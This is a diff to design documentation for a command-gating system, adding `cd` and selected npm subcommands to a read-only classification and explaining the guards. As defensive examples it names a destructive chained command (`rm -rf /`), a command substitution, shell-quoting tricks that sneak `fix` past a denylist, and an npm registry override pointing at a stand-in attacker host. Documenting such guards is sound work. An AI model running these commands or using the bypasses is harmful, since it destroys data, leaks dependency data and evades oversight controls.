@@ -143,8 +143,8 @@ classification the runtime gate uses.
 #### Built-in read-only commands
 
 A second `low`-severity floor recognizes any *provably read-only* Bash
-command (`git status`, `git diff`, `grep`, `cat`, `ls`, `head`, `sort
-FILE`, `tree DIR`, `file FILE`, ...),
+command (`git status`, `git diff`, `grep`, `cat`, `ls`, `head`, `cd`,
+`npm audit`, `npm ls`, `sort FILE`, `tree DIR`, `file FILE`, ...),
 reusing the same metachar-hardened classifier the understanding gate uses
 to allow reads without an approved report
 (`src/runtime/read-only-bash.ts`). It exists for the same reason as the
@@ -172,6 +172,63 @@ Some bins are classified read-only only when their write flags are absent
 - `file`: read-only when neither `-C` / `--compile` nor a short-flag
   cluster containing uppercase `C` appears. Lowercase `-c` (magic-file
   check) is benign and is not blocked.
+
+Two more entries floor a whole class of commands that were previously
+unclassified and, on a production-resolved session (checked-out `main`
+or `release/*`), blocked by a prod-scoped `risk.severity_at_least`
+policy even though neither can write anything:
+
+- `cd`: read-only unconditionally, like `pwd`. `cd` mutates only the
+  invoking shell process's own working directory; it cannot write to
+  the filesystem or touch production, and it has no flag whose value is
+  an output path, so it needs no per-bin write-flag guard. A chained or
+  redirected form (`cd /x && rm -rf /`, `cd $(evil)`) never reaches this
+  floor: it is refused up front by the same shell-metacharacter /
+  substitution guard described below, so only the bare navigation form
+  is ever classified read-only.
+- `npm`: a curated positive allowlist of read-only subcommands — `ls` /
+  `list` (installed tree), `view` / `info` / `show` (registry metadata;
+  `info` and `show` are npm's own aliases for `view`), `outdated`,
+  `why` / `explain` (dependency-reason report), `ping` — plus `npm
+  audit` and `npm audit signatures` (both reports). Only CANONICAL
+  spellings are floored: aliases like `la` / `ll` (for `ls -la` / `ls
+  -l`) and `v` (for `view`) are deliberately excluded, and stay gated
+  rather than miscategorized.
+
+  `npm audit fix` mutates the lockfile and `node_modules` and stays
+  gated even though bare `npm audit` is floored. This is enforced as a
+  POSITIVE shape, not a denylist on the literal word `fix`: every token
+  after `audit` must either start with `-` (a flag) or be the literal
+  `signatures`, or the whole command forfeits the floor. A denylist on
+  `fix` is a shell-quoting bypass — `npm audit "fix"`, `'fix'`, `f''ix`,
+  `fi"x"`, and `$'fix'` all reach npm as the plain argument `fix` (npm's
+  own arg parsing strips the quoting) while none of those raw tokens
+  equals the string `fix`, so an equality check on the untouched argv
+  would silently pass every one of them through to the mutating path.
+  The positive shape closes all such spellings, and any future npm
+  subcommand this floor has not reasoned about, in one rule; it fails
+  closed on any separated flag value (e.g. `npm audit --audit-level
+  high`, `npm audit --omit dev`), an acceptable, conservative false
+  negative — use the glued `--flag=value` form to stay floored.
+  Deliberately NOT blocked: `npm audit -fix` (single dash) — verified
+  npm 11.17.0 behavior is `Unknown cli config "--fix"`, report only, not
+  the mutating `fix` arm.
+
+  A `--registry` (including the per-scope `--@scope:registry` override),
+  `--userconfig`, or `--globalconfig` token anywhere in an npm invocation
+  forfeits the floor regardless of subcommand: these redirect npm's
+  registry or config lookups to an operator-unverified location, so
+  `npm audit --registry=http://attacker` (or the scoped
+  `--@myorg:registry=http://attacker`) would submit the full dependency
+  manifest to that host — exfiltration, not a safe read. This guard is a
+  CLI-token check only: it does not and cannot see `registry` set via
+  `.npmrc` or the `npm_config_registry` environment variable, which
+  redirect npm identically but leave no argv trace.
+
+  Every other npm subcommand (`install`, `ci`, `publish`, `update`,
+  `version`, ...) stays unclassified: the allowlist is positive, not a
+  denylist, so an npm verb this floor has not reasoned about is never
+  assumed safe.
 
 Bins excluded entirely from the floor (no per-bin guard possible):
 
